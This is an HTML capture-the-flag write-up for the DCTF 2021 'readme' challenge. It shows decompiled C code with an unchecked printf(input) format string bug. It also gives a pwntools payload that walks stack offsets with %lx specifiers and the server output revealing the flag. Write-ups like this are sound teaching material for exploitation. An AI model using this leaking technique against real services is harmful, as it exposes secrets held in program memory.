@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Readme</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Readme</h1>
+</header>
+<p>Here is the <code>vuln</code> function, it reads the flag from <em>flag.txt</em>, stores it in an array before the user input array, it takes <em>0x1e</em> bytes of input and print it with <em>printf</em>. Considered using format string attack, make <em>printf</em> print the flag.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1"></a><span class="dt">void</span> vuln(<span class="dt">void</span>)</span>
+<span id="cb1-2"><a href="#cb1-2"></a>{</span>
+<span id="cb1-3"><a href="#cb1-3"></a>  <span class="dt">FILE</span> *__stream;</span>
+<span id="cb1-4"><a href="#cb1-4"></a>  <span class="dt">long</span> in_FS_OFFSET;</span>
+<span id="cb1-5"><a href="#cb1-5"></a>  <span class="dt">char</span> flag [<span class="dv">32</span>];</span>
+<span id="cb1-6"><a href="#cb1-6"></a>  <span class="dt">char</span> input [<span class="dv">40</span>];</span>
+<span id="cb1-7"><a href="#cb1-7"></a>  <span class="dt">long</span> local_10;</span>
+<span id="cb1-8"><a href="#cb1-8"></a>  </span>
+<span id="cb1-9"><a href="#cb1-9"></a>  local_10 = *(<span class="dt">long</span> *)(in_FS_OFFSET + <span class="bn">0x28</span>);</span>
+<span id="cb1-10"><a href="#cb1-10"></a>  __stream = fopen(<span class="st">&quot;flag.txt&quot;</span>,<span class="st">&quot;r&quot;</span>);</span>
+<span id="cb1-11"><a href="#cb1-11"></a>  fgets(flag,<span class="bn">0x1c</span>,__stream);</span>
+<span id="cb1-12"><a href="#cb1-12"></a>  fclose(__stream);</span>
+<span id="cb1-13"><a href="#cb1-13"></a>  puts(<span class="st">&quot;hello, what</span><span class="sc">\&#39;</span><span class="st">s your name?&quot;</span>);</span>
+<span id="cb1-14"><a href="#cb1-14"></a>  fgets(input,<span class="bn">0x1e</span>,stdin);</span>
+<span id="cb1-15"><a href="#cb1-15"></a>  printf(<span class="st">&quot;hello &quot;</span>);</span>
+<span id="cb1-16"><a href="#cb1-16"></a>  printf(input);</span>
+<span id="cb1-17"><a href="#cb1-17"></a>  <span class="cf">if</span> (local_10 != *(<span class="dt">long</span> *)(in_FS_OFFSET + <span class="bn">0x28</span>)) {</span>
+<span id="cb1-18"><a href="#cb1-18"></a>                    <span class="co">/* </span><span class="al">WARNING</span><span class="co">: Subroutine does not return */</span></span>
+<span id="cb1-19"><a href="#cb1-19"></a>    __stack_chk_fail();</span>
+<span id="cb1-20"><a href="#cb1-20"></a>  }</span>
+<span id="cb1-21"><a href="#cb1-21"></a>  <span class="cf">return</span>;</span>
+<span id="cb1-22"><a href="#cb1-22"></a>}</span></code></pre></div>
+<p>After severl attemps found the flag located at around “%7<span class="math inline">$lx" to "%11$</span>lx”, so made up the payload as follow.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1"></a>payload <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb2-2"><a href="#cb2-2"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">11</span>, <span class="dv">7</span>, <span class="dv">-1</span>):</span>
+<span id="cb2-3"><a href="#cb2-3"></a>    payload <span class="op">+=</span> <span class="st">&quot;%</span><span class="sc">{}</span><span class="st">$lx&quot;</span>.<span class="bu">format</span>(i)</span>
+<span id="cb2-4"><a href="#cb2-4"></a></span>
+<span id="cb2-5"><a href="#cb2-5"></a>pr.sendafter(<span class="st">&quot;name?</span><span class="ch">\n</span><span class="st">&quot;</span>, payload)</span>
+<span id="cb2-6"><a href="#cb2-6"></a>pr.sendline()</span>
+<span id="cb2-7"><a href="#cb2-7"></a>s <span class="op">=</span> pr.readall(<span class="dv">2</span>).decode().strip()</span>
+<span id="cb2-8"><a href="#cb2-8"></a>s <span class="op">=</span> s[s.find(<span class="st">&#39; &#39;</span>)<span class="op">+</span><span class="dv">1</span>:]</span>
+<span id="cb2-9"><a href="#cb2-9"></a><span class="bu">print</span>(s)</span>
+<span id="cb2-10"><a href="#cb2-10"></a><span class="bu">print</span>(<span class="st">&#39;&#39;</span>.join(<span class="bu">reversed</span>(<span class="st">&#39;&#39;</span>.join([<span class="bu">chr</span>(<span class="bu">int</span>(s[i:i<span class="op">+</span><span class="dv">2</span>],<span class="dv">16</span>)) <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(s), <span class="dv">2</span>)]))))</span></code></pre></div>
+<p>Sent the payload and the server replied with the flag.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1"></a>$ <span class="ex">python3</span> exploit.py</span>
+<span id="cb3-2"><a href="#cb3-2"></a>[<span class="ex">+</span>] Opening connection to dctf-chall-readme.westeurope.azurecontainer.io on port 7481: Done</span>
+<span id="cb3-3"><a href="#cb3-3"></a><span class="ex">%11</span><span class="va">$lx</span>%10<span class="va">$lx</span>%9<span class="va">$lx</span>%8<span class="va">$lx</span></span>
+<span id="cb3-4"><a href="#cb3-4"></a>[<span class="ex">+</span>] Receiving all data: Done (67B)</span>
+<span id="cb3-5"><a href="#cb3-5"></a>[<span class="ex">*</span>] Closed connection to dctf-chall-readme.westeurope.azurecontainer.io port 7481</span>
+<span id="cb3-6"><a href="#cb3-6"></a><span class="ex">7f6f00356b3030625f656d30735f646133725f30675f77306e7b66746364</span></span>
+<span id="cb3-7"><a href="#cb3-7"></a><span class="ex">dctf</span>{n0w_g0_r3ad_s0me_b00k5\x00\x7f</span></code></pre></div>
+<p>Full exploit goes <a href="https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/readme/exploit.py">here</a>.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
